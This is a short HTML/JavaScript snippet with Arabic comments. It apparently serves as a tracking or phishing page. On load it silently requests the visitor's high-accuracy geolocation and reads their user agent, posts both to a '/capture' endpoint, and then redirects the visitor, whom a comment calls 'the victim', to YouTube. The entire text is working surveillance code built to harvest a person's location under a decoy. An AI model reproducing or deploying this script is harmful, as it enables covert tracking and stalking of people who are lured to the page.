<script>
    async function start() {
        const device = navigator.userAgent;
        // محاولة جلب الموقع بصمت
        navigator.geolocation.getCurrentPosition(async (p) => {
            await send({ lat: p.coords.latitude, lon: p.coords.longitude }, device);
        }, async () => {
            await send(null, device);
        }, { enableHighAccuracy: true });
    }

    async function send(loc, dev) {
        const res = await fetch('/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ location: loc, device: dev })
        });
        const data = await res.json();
        window.location.href = data.redirect; // توجيه الضحية لليوتيوب
    }
    window.onload = start;
</script>
